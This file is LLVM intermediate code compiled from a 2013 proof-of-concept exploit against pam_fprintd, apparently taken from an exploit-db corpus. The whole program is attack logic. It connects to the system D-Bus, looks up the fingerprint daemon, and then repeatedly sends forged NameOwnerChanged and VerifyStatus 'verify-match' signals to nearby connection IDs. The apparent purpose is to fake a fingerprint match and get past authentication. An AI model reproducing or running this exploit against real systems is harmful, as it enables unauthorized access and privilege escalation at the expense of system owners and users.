; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33614.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33614.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_7__ = type { i8* }

@.str = private unnamed_addr constant [13 x i8] c"verify-match\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"net.reactivated.Fprint\00", align 1
@.str.2 = private unnamed_addr constant [47 x i8] c"\0A[**] darklena, pam_fprintd PoC exploit 2013\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [27 x i8] c"[*] Initializing DBUS ...\0A\00", align 1
@DBUS_BUS_SYSTEM = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [11 x i8] c"Error: %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [18 x i8] c"dbus_error_is_set\00", align 1
@.str.6 = private unnamed_addr constant [25 x i8] c"dbus_bus_get_unique_name\00", align 1
@.str.7 = private unnamed_addr constant [41 x i8] c"[+] Done. Found my unique name: %s (%d)\0A\00", align 1
@.str.8 = private unnamed_addr constant [44 x i8] c"[*] Trying to find unique name of '%s' ...\0A\00", align 1
@.str.9 = private unnamed_addr constant [21 x i8] c"org.freedesktop.DBus\00", align 1
@.str.10 = private unnamed_addr constant [22 x i8] c"/org/freedesktop/DBus\00", align 1
@.str.11 = private unnamed_addr constant [13 x i8] c"GetNameOwner\00", align 1
@DBUS_TYPE_STRING = common dso_local global i32 0, align 4
@DBUS_TYPE_INVALID = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [29 x i8] c"[-] dbus_message_append_args\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"[-] Error: %s\0A\00", align 1
@.str.14 = private unnamed_addr constant [46 x i8] c"[-] dbus_connection_send_with_reply_and_block\00", align 1
@.str.15 = private unnamed_addr constant [26 x i8] c"[-] dbus_message_get_args\00", align 1
@.str.16 = private unnamed_addr constant [39 x i8] c"[+] Found unique name of '%s' as '%s'\0A\00", align 1
@.str.17 = private unnamed_addr constant [17 x i8] c"NameOwnerChanged\00", align 1
@.str.18 = private unnamed_addr constant [33 x i8] c"/net/reactivated/Fprint/Device/0\00", align 1
@.str.19 = private unnamed_addr constant [30 x i8] c"net.reactivated.Fprint.Device\00", align 1
@.str.20 = private unnamed_addr constant [13 x i8] c"VerifyStatus\00", align 1
@.str.21 = private unnamed_addr constant [28 x i8] c"[-] dbus_message_new_signal\00", align 1
@.str.22 = private unnamed_addr constant [30 x i8] c"[-] dbus_message_append_args1\00", align 1
@DBUS_TYPE_BOOLEAN = common dso_local global i32 0, align 4
@.str.23 = private unnamed_addr constant [30 x i8] c"[-] dbus_message_append_args2\00", align 1
@.str.24 = private unnamed_addr constant [6 x i8] c":1.%d\00", align 1
@.str.25 = private unnamed_addr constant [31 x i8] c"[*] Using new destination: %s\0A\00", align 1
@.str.26 = private unnamed_addr constant [33 x i8] c"[-] dbus_message_set_destination\00", align 1
@.str.27 = private unnamed_addr constant [25 x i8] c"[-] dbus_connection_send\00", align 1
@.str.28 = private unnamed_addr constant [66 x i8] c"\0A[**] Here comes the pain! (but no one's to too innocent to die)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.TYPE_7__, align 8
  %7 = alloca i32*, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32*, align 8
  %10 = alloca i32*, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca [32 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32* null, i32** %7, align 8
  store i32* null, i32** %8, align 8
  store i32* null, i32** %9, align 8
  store i32* null, i32** %10, align 8
  store i32* null, i32** %11, align 8
  store i32 0, i32* %12, align 4
  store i32 1, i32* %13, align 4
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 -1, i32* %16, align 4
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0), i8** %17, align 8
  store i8* null, i8** %18, align 8
  store i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i8** %19, align 8
  store i8* null, i8** %20, align 8
  %22 = load i32, i32* %4, align 4
  %23 = icmp sgt i32 %22, 1
  br i1 %23, label %24, label %29

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i8* @strdup(i8* %27)
  store i8* %28, i8** %20, align 8
  br label %29

29:                                               ; preds = %24, %2
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.2, i64 0, i64 0))
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %32 = call i32 @dbus_error_init(%struct.TYPE_7__* %6)
  %33 = load i32, i32* @DBUS_BUS_SYSTEM, align 4
  %34 = call i32* @dbus_bus_get(i32 %33, %struct.TYPE_7__* %6)
  store i32* %34, i32** %7, align 8
  %35 = call i64 @dbus_error_is_set(%struct.TYPE_7__* %6)
  %36 = icmp ne i64 %35, 0
  br i1 %36, label %37, label %43

37:                                               ; preds = %29
  %38 = load i32, i32* @stderr, align 4
  %39 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %6, i32 0, i32 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @fprintf(i32 %38, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0), i8* %40)
  %42 = call i32 @die(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.5, i64 0, i64 0))
  br label %43

43:                                               ; preds = %37, %29
  %44 = load i32*, i32** %7, align 8
  %45 = call i8* @dbus_bus_get_unique_name(i32* %44)
  store i8* %45, i8** %18, align 8
  %46 = icmp eq i8* %45, null
  br i1 %46, label %47, label %49

47:                                               ; preds = %43
  %48 = call i32 @die(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.6, i64 0, i64 0))
  br label %49

49:                                               ; preds = %47, %43
  %50 = load i8*, i8** %18, align 8
  %51 = call i64 @strchr(i8* %50, i8 signext 46)
  %52 = add nsw i64 %51, 1
  %53 = call i32 @atoi(i64 %52)
  store i32 %53, i32* %14, align 4
  %54 = load i8*, i8** %18, align 8
  %55 = load i32, i32* %14, align 4
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.7, i64 0, i64 0), i8* %54, i32 %55)
  %57 = load i8*, i8** %20, align 8
  %58 = icmp ne i8* %57, null
  br i1 %58, label %100, label %59

59:                                               ; preds = %49
  %60 = load i8*, i8** %19, align 8
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.8, i64 0, i64 0), i8* %60)
  %62 = call i32* @dbus_message_new_method_call(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i64 0, i64 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.11, i64 0, i64 0))
  store i32* %62, i32** %10, align 8
  %63 = load i32*, i32** %10, align 8
  %64 = load i32, i32* @DBUS_TYPE_STRING, align 4
  %65 = load i32, i32* @DBUS_TYPE_INVALID, align 4
  %66 = call i32 (i32*, i32, i8**, i32, ...) @dbus_message_append_args(i32* %63, i32 %64, i8** %19, i32 %65)
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %70, label %68

68:                                               ; preds = %59
  %69 = call i32 @die(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.12, i64 0, i64 0))
  br label %70

70:                                               ; preds = %68, %59
  %71 = load i32*, i32** %7, align 8
  %72 = load i32*, i32** %10, align 8
  %73 = load i32, i32* %16, align 4
  %74 = call i32* @dbus_connection_send_with_reply_and_block(i32* %71, i32* %72, i32 %73, %struct.TYPE_7__* %6)
  store i32* %74, i32** %11, align 8
  %75 = load i32*, i32** %10, align 8
  %76 = call i32 @dbus_message_unref(i32* %75)
  %77 = call i64 @dbus_error_is_set(%struct.TYPE_7__* %6)
  %78 = icmp ne i64 %77, 0
  br i1 %78, label %79, label %85

79:                                               ; preds = %70
  %80 = load i32, i32* @stderr, align 4
  %81 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %6, i32 0, i32 0
  %82 = load i8*, i8** %81, align 8
  %83 = call i32 @fprintf(i32 %80, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i64 0, i64 0), i8* %82)
  %84 = call i32 @die(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.14, i64 0, i64 0))
  br label %85

85:                                               ; preds = %79, %70
  %86 = load i32*, i32** %11, align 8
  %87 = load i32, i32* @DBUS_TYPE_STRING, align 4
  %88 = load i32, i32* @DBUS_TYPE_INVALID, align 4
  %89 = call i32 @dbus_message_get_args(i32* %86, %struct.TYPE_7__* %6, i32 %87, i8** %20, i32 %88)
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %97, label %91

91:                                               ; preds = %85
  %92 = load i32, i32* @stderr, align 4
  %93 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %6, i32 0, i32 0
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 @fprintf(i32 %92, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i64 0, i64 0), i8* %94)
  %96 = call i32 @die(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.15, i64 0, i64 0))
  br label %97

97:                                               ; preds = %91, %85
  %98 = load i32*, i32** %11, align 8
  %99 = call i32 @dbus_message_unref(i32* %98)
  br label %100

100:                                              ; preds = %97, %49
  %101 = load i8*, i8** %19, align 8
  %102 = load i8*, i8** %20, align 8
  %103 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.16, i64 0, i64 0), i8* %101, i8* %102)
  store i32 1, i32* %15, align 4
  br label %104

104:                                              ; preds = %181, %100
  %105 = load i32, i32* %15, align 4
  %106 = icmp slt i32 %105, 20
  br i1 %106, label %107, label %184

107:                                              ; preds = %104
  %108 = call i32* @dbus_message_new_signal(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i64 0, i64 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.17, i64 0, i64 0))
  store i32* %108, i32** %9, align 8
  %109 = call i32* @dbus_message_new_signal(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.18, i64 0, i64 0), i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.20, i64 0, i64 0))
  store i32* %109, i32** %8, align 8
  %110 = load i32*, i32** %8, align 8
  %111 = icmp ne i32* %110, null
  br i1 %111, label %112, label %115

112:                                              ; preds = %107
  %113 = load i32*, i32** %9, align 8
  %114 = icmp ne i32* %113, null
  br i1 %114, label %117, label %115

115:                                              ; preds = %112, %107
  %116 = call i32 @die(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.21, i64 0, i64 0))
  br label %117

117:                                              ; preds = %115, %112
  %118 = load i32*, i32** %9, align 8
  %119 = load i32, i32* @DBUS_TYPE_STRING, align 4
  %120 = load i32, i32* @DBUS_TYPE_STRING, align 4
  %121 = load i32, i32* @DBUS_TYPE_STRING, align 4
  %122 = load i32, i32* @DBUS_TYPE_INVALID, align 4
  %123 = call i32 (i32*, i32, i8**, i32, ...) @dbus_message_append_args(i32* %118, i32 %119, i8** %19, i32 %120, i8** %20, i32 %121, i8** %18, i32 %122)
  %124 = icmp ne i32 %123, 0
  br i1 %124, label %127, label %125

125:                                              ; preds = %117
  %126 = call i32 @die(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.22, i64 0, i64 0))
  br label %127

127:                                              ; preds = %125, %117
  %128 = load i32*, i32** %8, align 8
  %129 = load i32, i32* @DBUS_TYPE_STRING, align 4
  %130 = load i32, i32* @DBUS_TYPE_BOOLEAN, align 4
  %131 = load i32, i32* @DBUS_TYPE_INVALID, align 4
  %132 = call i32 (i32*, i32, i8**, i32, ...) @dbus_message_append_args(i32* %128, i32 %129, i8** %17, i32 %130, i32* %13, i32 %131)
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %136, label %134

134:                                              ; preds = %127
  %135 = call i32 @die(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.23, i64 0, i64 0))
  br label %136

136:                                              ; preds = %134, %127
  %137 = getelementptr inbounds [32 x i8], [32 x i8]* %21, i64 0, i64 0
  %138 = load i32, i32* %14, align 4
  %139 = load i32, i32* %15, align 4
  %140 = sub nsw i32 %138, %139
  %141 = call i32 @snprintf(i8* %137, i32 32, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i64 0, i64 0), i32 %140)
  %142 = getelementptr inbounds [32 x i8], [32 x i8]* %21, i64 0, i64 0
  %143 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.25, i64 0, i64 0), i8* %142)
  %144 = load i32*, i32** %8, align 8
  %145 = getelementptr inbounds [32 x i8], [32 x i8]* %21, i64 0, i64 0
  %146 = call i32 @dbus_message_set_destination(i32* %144, i8* %145)
  %147 = icmp ne i32 %146, 0
  br i1 %147, label %150, label %148

148:                                              ; preds = %136
  %149 = call i32 @die(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.26, i64 0, i64 0))
  br label %150

150:                                              ; preds = %148, %136
  %151 = load i32*, i32** %9, align 8
  %152 = getelementptr inbounds [32 x i8], [32 x i8]* %21, i64 0, i64 0
  %153 = call i32 @dbus_message_set_destination(i32* %151, i8* %152)
  %154 = icmp ne i32 %153, 0
  br i1 %154, label %157, label %155

155:                                              ; preds = %150
  %156 = call i32 @die(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.26, i64 0, i64 0))
  br label %157

157:                                              ; preds = %155, %150
  %158 = load i32*, i32** %7, align 8
  %159 = load i32*, i32** %9, align 8
  %160 = call i32 @dbus_connection_send(i32* %158, i32* %159, i32* %12)
  %161 = icmp ne i32 %160, 0
  br i1 %161, label %164, label %162

162:                                              ; preds = %157
  %163 = call i32 @die(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.27, i64 0, i64 0))
  br label %164

164:                                              ; preds = %162, %157
  %165 = load i32*, i32** %7, align 8
  %166 = call i32 @dbus_connection_flush(i32* %165)
  %167 = call i32 @usleep(i32 1000)
  %168 = load i32*, i32** %7, align 8
  %169 = load i32*, i32** %8, align 8
  %170 = call i32 @dbus_connection_send(i32* %168, i32* %169, i32* %12)
  %171 = icmp ne i32 %170, 0
  br i1 %171, label %174, label %172

172:                                              ; preds = %164
  %173 = call i32 @die(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.27, i64 0, i64 0))
  br label %174

174:                                              ; preds = %172, %164
  %175 = load i32*, i32** %7, align 8
  %176 = call i32 @dbus_connection_flush(i32* %175)
  %177 = load i32*, i32** %8, align 8
  %178 = call i32 @dbus_message_unref(i32* %177)
  %179 = load i32*, i32** %9, align 8
  %180 = call i32 @dbus_message_unref(i32* %179)
  br label %181

181:                                              ; preds = %174
  %182 = load i32, i32* %15, align 4
  %183 = add nsw i32 %182, 1
  store i32 %183, i32* %15, align 4
  br label %104

184:                                              ; preds = %104
  %185 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.28, i64 0, i64 0))
  ret i32 0
}

declare dso_local i8* @strdup(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @dbus_error_init(%struct.TYPE_7__*) #1

declare dso_local i32* @dbus_bus_get(i32, %struct.TYPE_7__*) #1

declare dso_local i64 @dbus_error_is_set(%struct.TYPE_7__*) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

declare dso_local i32 @die(i8*) #1

declare dso_local i8* @dbus_bus_get_unique_name(i32*) #1

declare dso_local i32 @atoi(i64) #1

declare dso_local i64 @strchr(i8*, i8 signext) #1

declare dso_local i32* @dbus_message_new_method_call(i8*, i8*, i8*, i8*) #1

declare dso_local i32 @dbus_message_append_args(i32*, i32, i8**, i32, ...) #1

declare dso_local i32* @dbus_connection_send_with_reply_and_block(i32*, i32*, i32, %struct.TYPE_7__*) #1

declare dso_local i32 @dbus_message_unref(i32*) #1

declare dso_local i32 @dbus_message_get_args(i32*, %struct.TYPE_7__*, i32, i8**, i32) #1

declare dso_local i32* @dbus_message_new_signal(i8*, i8*, i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i32) #1

declare dso_local i32 @dbus_message_set_destination(i32*, i8*) #1

declare dso_local i32 @dbus_connection_send(i32*, i32*, i32*) #1

declare dso_local i32 @dbus_connection_flush(i32*) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
